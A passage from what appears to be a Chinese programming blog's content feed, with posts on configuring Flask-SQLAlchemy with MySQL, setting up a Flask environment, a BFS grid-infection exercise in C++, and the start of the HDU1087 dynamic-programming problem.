class="string">'mysql'</span>  <span class="comment"># 要用的什么数据库</span></span><br><span class="line"><span class="attr">DRIVER</span> = <span class="string">'mysqlconnector'</span> <span class="comment"># 连接数据库驱动   官方驱动解决1366问题</span></span><br><span class="line"><span class="attr">USERNAME</span> = <span class="string">'root'</span>  <span class="comment"># 用户名</span></span><br><span class="line"><span class="attr">PASSWORD</span> =<span class="string">'root'</span>  <span class="comment"># 密码</span></span><br><span class="line"><span class="attr">HOST</span> = <span class="string">'localhost'</span>  <span class="comment"># 服务器</span></span><br><span class="line"><span class="attr">PORT</span> =<span class="string">'3306'</span> <span class="comment"># 端口</span></span><br><span class="line"><span class="attr">DATABASE</span> = <span class="string">'flask'</span> <span class="comment"># 数据库名</span></span><br><span class="line"></span><br><span class="line"><span class="attr">SQLALCHEMY_DATABASE_URI</span> = <span class="string">"&#123;&#125;+&#123;&#125;://&#123;&#125;:&#123;&#125;@&#123;&#125;:&#123;&#125;/&#123;&#125;?charset=utf8"</span>.format(DIALECT, DRIVER, USERNAME, PASSWORD, HOST, PORT, DATABASE)</span><br><span class="line"><span class="attr">SQLALCHEMY_TRACK_MODIFICATIONS</span> = <span class="literal">False</span></span><br></pre></td></tr></table></figure><h3 id="注意可能会有1366错误"><a href="#注意可能会有1366错误" class="headerlink" title="注意可能会有1366错误"></a>注意可能会有1366错误</h3><p><code>Warning: (1366, &quot;Incorrect string value: &#39;\\xD6\\xD0\\xB9\\xFA\\xB1\\xEA...&#39; for column &#39;VARIABLE_VALUE&#39; at row 484&quot;)  result = self._query(query)</code></p><p id="div-border-left-purple">错误要换成MySQL自己的驱动mysqlconnector,不过我代码已经换好了- -</p><h2 id="ModuleNotFoundError-No-module-named-‘mysql’错误"><a href="#ModuleNotFoundError-No-module-named-‘mysql’错误" class="headerlink" title="ModuleNotFoundError: No module named ‘mysql’错误"></a>ModuleNotFoundError: No module named ‘mysql’错误</h2><p id="div-border-left-purple">要安装驱动`pip install mysql-connector`</p><h3 id="init-py读取配置文件"><a href="#init-py读取配置文件" class="headerlink" title="__init__.py读取配置文件"></a><code>__init__.py</code>读取配置文件</h3><p>因为有顺序问题，我直接把源码放出来-.-多删少补</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># _*_ coding: utf<span class="number">-8</span> _*_</span><br><span class="line"># @Time  : <span class="number">2020</span>/<span class="number">3</span>/<span class="number">10</span> <span class="number">11</span>:<span class="number">39</span></span><br><span class="line"># @Author: ChenZIDu</span><br><span class="line"># @File  : __init__.py</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"># <span class="keyword">import</span>  os</span><br><span class="line"># print(os.environ.keys())</span><br><span class="line"># print(os.environ.get(<span class="string">'FLASKR_SETTINGS'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 加载配置文件内容</span><br><span class="line">app.config.from_object(<span class="string">'blog.setting'</span>)      # 模块下的setting文件名，不用加py后缀</span><br><span class="line">app.config.from_envvar(<span class="string">'FLASKR_SETTINGS'</span>)    # 环境变量，指向配置文件setting的路径</span><br><span class="line"></span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line"># 创建数据库对象</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> blog.model <span class="keyword">import</span> User,Category    ##下面两句都要在db下面，因为要先创建才能用</span><br><span class="line">db.create_all()</span><br></pre></td></tr></table></figure><p id="div-border-left-blue">FLASKR_SETTINGS环境变量要自己设置<p>可以手动设置，或者再powershell里面设置<p><code>set FLASKR_SETTINGS=C:\***\FirstFlask\blog\setting.py</code><br><strong>后面放绝对路径就行了</strong></p><h2 id="设计数据库"><a href="#设计数据库" class="headerlink" title="设计数据库"></a>设计数据库</h2><p>建两个表：User、Category表，一个放文章一个放用户，采用python的orm框架flask-sqlalchemy实现表的创建、增删改查功能。<br></p><ul><li>在model文件夹中添加User.py和Category.py文件</li></ul><ol><li>User.py<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># _*_ coding: utf-8 _*_</span></span><br><span class="line"><span class="comment">#<span class="doctag">@Time</span>  : 2020/3/10 18:17</span></span><br><span class="line"><span class="comment">#<span class="doctag">@Author</span>: ChenZIDu</span></span><br><span class="line"><span class="comment">#<span class="doctag">@File</span>  : User.py</span></span><br><span class="line"></span><br><span class="line">from blog import db</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>(<span class="title">db</span>.<span class="title">Model</span>):</span></span><br><span class="line">    __tablename_<span class="number">_</span> = <span class="string">'b_user'</span></span><br><span class="line">    id = db.Column(db.Integer,primary_key=True)</span><br><span class="line">    username = db.Column(db.String(<span class="number">10</span>),unique=True)</span><br><span class="line">    password = db.Column(db.String(<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>,username,password)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.username  = username</span><br><span class="line">        <span class="keyword">self</span>.password = password</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;User %r&gt;'</span> % <span class="keyword">self</span>.username</span><br></pre></td></tr></table></figure></li><li>Category.py<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># _*_ coding: utf-8 _*_</span></span><br><span class="line"><span class="comment">#<span class="doctag">@Time</span>  : 2020/3/10 19:07</span></span><br><span class="line"><span class="comment">#<span class="doctag">@Author</span>: ChenZIDu</span></span><br><span class="line"><span class="comment">#<span class="doctag">@File</span>  : Category.py</span></span><br><span class="line"></span><br><span class="line">from blog import db</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Category</span>(<span class="title">db</span>.<span class="title">Model</span>):</span></span><br><span class="line">    __tablename_<span class="number">_</span> = <span class="string">'b_category'</span></span><br><span class="line">    id = db.Column(db.Integer,primary_key=True)</span><br><span class="line">    title = db.Column(db.String(<span class="number">20</span>),unique=True)</span><br><span class="line">    content = db.Column(db.String(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>,title,content)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.title = title</span><br><span class="line">        <span class="keyword">self</span>.content = content</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;Category %r&gt;'</span> % <span class="keyword">self</span>.title</span><br></pre></td></tr></table></figure>创建数据表的语句已经再<code>__init__.py</code>里面了，也可以在<code>Python Console</code>里面搞</li></ol><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> blog2 <span class="keyword">import</span> db  <span class="comment">#建立连接</span></span><br><span class="line">db.create_all()   <span class="comment">#创建数据表</span></span><br></pre></td></tr></table></figure><p><img src="/2.jpg" alt="powershell"></p><hr><p><strong>这一章完结，欢迎友链,打动态规划去了(逃~~)</strong></p>]]></content>
      
      
      <categories>
          
          <category> Flask </category>
          
          <category> sqlalchemy </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flask开发环境搭建</title>
      <link href="/2020/03/09/Flask%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/03/09/Flask%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>想做个Python的小项目练练手~~，选择了Flask,因为平常遇到的比较多，而且大数据也要用这个应用框架。“民”心所向-哈哈哈哈。</p><a id="more"></a><p id="div-border-left-blue">Flask</p><blockquote class="blockquote-center"><p>Flask是一个使用 Python 编写的轻量级 Web 应用框架。<br>其 WSGI 工具箱采用 Werkzeug ，模板引擎则使用 Jinja2。很多功能的实现都参考了django框架。。</p></blockquote><h2 id="创建一个Flask项目"><a href="#创建一个Flask项目" class="headerlink" title="创建一个Flask项目"></a>创建一个Flask项目</h2><p>PyCharm不是社区版可以直接创建。如果不行<code>pip install flask</code></p><p>在app.py中添加一个新的路由</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@app</span>.route(<span class="string">'/test'</span>)</span><br><span class="line"><span class="variable">@app</span>.route(<span class="string">'/test/&lt;name&gt;'</span>)  # 路由</span><br><span class="line">def test(name):</span><br><span class="line">    return render_template(<span class="string">'test.html'</span>,name=name)</span><br></pre></td></tr></table></figure><p><strong>在templates中添加test.html文件</strong></p><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Welcome to </span><span class="template-variable">&#123;&#123;name&#125;&#125;</span><span class="xml">!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><img src="/1.jpg" alt="Flask"></p><p>访问<code>http://127.0.0.1:5000/test/ChenZIDu</code>,发现内容被渲染。</p><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><h2 id="flask-sqlalchemy基于sqlalchemy基于Pymysql，特别搞笑，套娃-安装Pymysql-再装sqlalchemy-接着装flask-sqlalchemy-因为我网不行，用官方源的话，每秒就50KB怎么改都超时，所以我这边会超时的都改成了清华大学的镜像源，-i的意思是临时使用，当然网上也有永久更改的教程。"><a href="#flask-sqlalchemy基于sqlalchemy基于Pymysql，特别搞笑，套娃-安装Pymysql-再装sqlalchemy-接着装flask-sqlalchemy-因为我网不行，用官方源的话，每秒就50KB怎么改都超时，所以我这边会超时的都改成了清华大学的镜像源，-i的意思是临时使用，当然网上也有永久更改的教程。" class="headerlink" title="flask-sqlalchemy基于sqlalchemy基于Pymysql，特别搞笑，套娃~~安装Pymysql:再装sqlalchemy:接着装flask-sqlalchemy:因为我网不行，用官方源的话，每秒就50KB怎么改都超时，所以我这边会超时的都改成了清华大学的镜像源，-i的意思是临时使用，当然网上也有永久更改的教程。"></a><strong>flask-sqlalchemy基于sqlalchemy基于Pymysql，特别搞笑，套娃~~</strong><br><p id="div-border-left-red">安装Pymysql:</p><br><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip <span class="keyword">install</span> PyMySQL</span><br></pre></td></tr></table></figure><br><p id="div-border-left-green">再装sqlalchemy:</p><br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -i <span class="string">https:</span><span class="comment">//pypi.tuna.tsinghua.edu.cn/simple sqlalchemy</span></span><br></pre></td></tr></table></figure><br><p id="div-border-left-purple">接着装flask-sqlalchemy:</p><br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -i <span class="string">https:</span><span class="comment">//pypi.tuna.tsinghua.edu.cn/simple flask-sqlalchemy</span></span><br></pre></td></tr></table></figure><br>因为我网不行，用官方源的话，每秒就50KB怎么改都超时，所以我这边会超时的都改成了清华大学的镜像源，-i的意思是临时使用，当然网上也有永久更改的教程。</h2><p>到此环境搭建完成.</p><p><strong>参考</strong><br><a href="https://dormousehole.readthedocs.io/en/latest/" target="_blank" rel="noopener">Flask</a><br><a href="https://www.cnblogs.com/mysql-dba/p/6066861.html" target="_blank" rel="noopener">茁壮的小草</a></p>]]></content>
      
      
      <categories>
          
          <category> Flask </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BFS宽度优先搜索(新冠病毒的传播)</title>
      <link href="/2020/03/08/%E6%96%B0%E5%86%A0%E7%97%85%E6%AF%92%E7%9A%84%E4%BC%A0%E6%92%AD-BFS/"/>
      <url>/2020/03/08/%E6%96%B0%E5%86%A0%E7%97%85%E6%AF%92%E7%9A%84%E4%BC%A0%E6%92%AD-BFS/</url>
      
        <content type="html"><![CDATA[<p>应该是我博客的第一篇广度优先搜索的算法了吧，之前题目都用的DFS，因为DFS确实比较熟练点，BFS虽然很久之前就知道他是怎么实现的但是没怎么自己真正实践过~~~而且以前一听队列就头大，不过最近这方面需求还挺大的-.-</p><a id="more"></a><p id="div-border-left-red">了解下BFS</p><blockquote class="blockquote-center"><p><strong>宽度优先搜索</strong><br>(Breadth First Search)</p></blockquote><p id="div-border-top-green">宽度优先搜索算法（又称广度优先搜索）是最简便的图的搜索算法之一，这一算法也是很多重要的图的算法的原型。Dijkstra单源最短路径算法和Prim最小生成树算法都采用了和宽度优先搜索类似的思想。其别名又叫BFS，属于一种盲目搜寻法，目的是系统地展开并检查图中的所有节点，以找寻结果。换句话说，它并不考虑结果的可能位置，彻底地搜索整张图，直到找到结果为止。</p><p id="div-border-left-yellow">简单的说应该就是，搜索当前可以到达的地方，压入队列，然后再取首元素，再查找，继续压入队列，<b>与DFS有什么不同呢</b>：把两个搜索比作探案，DFS就像是先摸着一个线索，然后深究到最后，如果不通再返回，查看有没有其他错过的东西，而BFS就像有逻辑的侦探，先找到能找到的所有线索，把它们收集起来，然后再一个个拨开，把它们后面的线索再收集起来。</p><p><strong>在这里提供一个模板</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">迷宫题型</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bfs</span><span class="params">()</span></span>&#123;</span><br><span class="line">    起点入队    <span class="comment">//迷宫题用结构体存X，Y</span></span><br><span class="line">    <span class="keyword">while</span>(队列不为空)&#123;</span><br><span class="line">        当前点 = <span class="built_in">queue</span>.front();             <span class="comment">//取出队首元素</span></span><br><span class="line">        <span class="keyword">for</span>(四个方向)&#123;</span><br><span class="line">            xx=x+上下左右</span><br><span class="line">            yy=y+上下左右</span><br><span class="line">            <span class="keyword">if</span>(判断X，y有无越界)&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(如果能走)&#123;</span><br><span class="line">                结构体 k;</span><br><span class="line">                <span class="built_in">queue</span>.push(k);</span><br><span class="line">                标记</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>推荐</strong></p><p><a href="https://www.bilibili.com/video/av25761720?from=search&seid=15393033914118681280" target="_blank" rel="noopener">正月点灯笼:BFS讲解</a><br>如果有时间的话可以看下上面这个博主的视频，很久以前关注的，这个真的讲的很形象~~</p><hr><p id="div-border-top-blue">来道例题</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>最近新冠病毒疫情非常严重，由于我们国家采取了有力的措施，才没有使疫情进一步的扩大。今天，作为计算机专业的学生，我们来用程序模拟一下各种情况下的新冠病毒传播情况。现在给定一个n * m的网格，每个网格可以有以下三个值之一：<br>值 0 代表隔离带。<br>值 1 代表健康人群。<br>值 2 代表感染人群。<br>每天，任何与感染人群（在 4 个正方向上）相邻的健康人都会感染。如果遇到隔离带，病毒就会被阻断。<br>输出直到单元格中没有健康人为止所必须经过的最小天数。如果不可能所有人都被感染，输出 -1。</p><h2 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h2><p>测试数据由多组测试样例组成。第一行输入两个正整数 n ( 1 &lt;&#x3D; n &lt;&#x3D; 500 ） 和 m ( 1 &lt;&#x3D; m &lt;&#x3D; 500 ），<br>接下来输入n * m个数字，数字均由 0 ， 1 ，2构成</p><h2 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h2><p>每组测试样例，输出直到单元格中没有健康人为止所必须经过的最小天数。如果不可能，输出 -1。</p><h2 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">3 </span><span class="number">3</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="symbol">0 </span><span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">3</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">0 </span><span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">0</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">1 </span><span class="number">2</span></span><br><span class="line"><span class="symbol">0 </span><span class="number">2</span></span><br></pre></td></tr></table></figure><h2 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">-1</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> dir[<span class="number">4</span>][<span class="number">2</span>]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> Map[<span class="number">1000</span>][<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">int</span> qx;</span><br><span class="line"><span class="keyword">int</span> qy;</span><br><span class="line"><span class="keyword">int</span> n,m,sum;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fun</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="keyword">int</span> y;</span><br><span class="line"><span class="keyword">int</span> t;</span><br><span class="line">&#125;great;</span><br><span class="line"><span class="built_in">queue</span>&lt;fun&gt; q;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bfs</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(q.<span class="built_in">size</span>())&#123;</span><br><span class="line">fun num= q.front();<span class="comment">//取出</span></span><br><span class="line"><span class="keyword">if</span>(num.t&gt;sum)</span><br><span class="line">sum=num.t;</span><br><span class="line">q.pop();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line"><span class="keyword">int</span> xx=num.x+dir[i][<span class="number">0</span>];</span><br><span class="line"><span class="keyword">int</span> yy=num.y+dir[i][<span class="number">1</span>];</span><br><span class="line"><span class="keyword">if</span>(xx&lt;<span class="number">0</span>||xx&gt;n||yy&lt;<span class="number">0</span>||yy&gt;m)&#123;<span class="comment">//越界 </span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(Map[xx][yy]!=<span class="number">0</span>&amp;&amp;Map[xx][yy]!=<span class="number">2</span>)&#123; </span><br><span class="line">fun k;</span><br><span class="line">k.x=xx;</span><br><span class="line">k.y=yy;</span><br><span class="line">k.t=num.t+<span class="number">1</span>;</span><br><span class="line">q.push(k);</span><br><span class="line">Map[xx][yy]=<span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;n,&amp;m)!=EOF)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;Map[i][j]);</span><br><span class="line"><span class="keyword">if</span>(Map[i][j]==<span class="number">2</span>)&#123;</span><br><span class="line">great.x=i;<span class="comment">//当前坐标 </span></span><br><span class="line">great.y=j;</span><br><span class="line">great.t=<span class="number">0</span>;</span><br><span class="line">q.push(great);<span class="comment">//起始点压入 </span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">sum=<span class="number">0</span>;</span><br><span class="line">bfs();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(Map[i][j]==<span class="number">1</span>)&#123;</span><br><span class="line">sum=<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d\n"</span>,sum);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
          <category> 日常训练 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HDU1087超级跳跃~跳~跳~(DP)</title>
      <link href="/2020/03/07/HDU1087-DP/"/>
      <url>/2020/03/07/HDU1087-DP/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>如今，一种名为“超级跳跃！跳！跳！” 在HDU中非常受欢迎。也许您是个好孩子，对这个游戏了解得很少，所以现在向您介绍一下。<br><img src="/1.jpg"><br>该游戏可以由两个或两个以上的玩家玩。它由一个棋盘（棋盘）和一些棋子（棋子）组成，所有棋子均标有正整数或“开始”或“结束”。播放器从起点开始，必须最终跳到终点。在跳跃过程中，玩家将走访这条棋子，但每个人都必须从一个棋子跳到另一个绝对更大的棋子（您可以假设起点是最小值，终点是最大值）。而且所有玩家都不能后退。一跳可以从一个国际象棋棋子跳到下一个，也可以跨越许多国际象棋棋子，甚至您也可以从起点直接到达终点。在这种情况下，您当然会得到零分。一个球员只有并且根据他的跳跃解决方案能够获得更大的分数时才是赢家。<br>您的任务是根据给定的西洋棋棋子列表输出最大值。</p><a id="more"></a><h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>输入包含多个测试用例。每个测试用例的描述如下：N n[1]、n[2]、n[3]….n[N]确保N不超过1000，并且所有n[i]都在32-int范围内。以0开头的测试用例将终止输入，并且该测试用例将不被处理。</p><h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>对于每种情况，请按照规则打印最大值，然后一行打印一种情况。</p><h2 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h2><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">3 </span><span class="number">1</span> <span class="number">3</span> <span class="number">2</span></span><br><span class="line"><span class="symbol">4 </span><span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">4 </span><span class="number">3</span> <span class="number">3</span> <span class="number">2</span> <span class="number">1</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h2><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 